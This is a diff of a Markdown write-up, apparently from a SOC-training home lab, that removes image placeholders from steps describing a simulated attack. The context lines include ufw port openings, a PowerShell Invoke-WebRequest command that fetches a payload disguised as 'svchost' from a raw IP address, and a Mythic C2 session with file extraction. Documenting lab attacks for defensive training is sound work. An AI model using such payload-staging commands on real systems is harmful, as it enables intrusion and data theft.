@@ -166,9 +166,9 @@
     ufw allow 80
     ufw allow 9999
     ```
-  ![Allowing HTTP Connection](link_to_your_image) <!-- Replace with actual image link -->
+  
 - Ran the payload on the Windows server.
-  ![Payload Execution](link_to_your_image) <!-- Replace with actual image link -->
+
     
 - run the python session:
     ```bash
@@ -179,12 +179,11 @@
     ```bash
     Invoke-WebRequest -Uri http://45.76.248.184:9999/svchost-SOC-Project.exe -OutFile "C:\Users\Public\Downloads\svchost-SOC-Project.exe"
     ```
-  ![Payload Creation](link_to_your_image) <!-- Replace with actual image link -->
+
 ### 14. Monitor The Connection
 - Result of the payload on the Windows server.
   ![Payload Execution](https://github.com/Jacob-Brown-950/30-Day-SOC-Challenge/blob/main/Screenshots/Step%2077%20We%20can%20see%20our%20established%20session.PNG)
 - Monitored Mythic GUI for established session and confirmed successful file extraction from the agent.
-  ![Mythic GUI Session](link_to_your_image) <!-- Replace with actual image link -->
   ![Mythic GUI Session](https://github.com/Jacob-Brown-950/30-Day-SOC-Challenge/blob/main/Screenshots/Step%2078%20Our%20attack%20was%20successful%2C%20we%20got%20the%20file.PNG) <!-- Replace with actual image link -->
 
 ## Conclusion
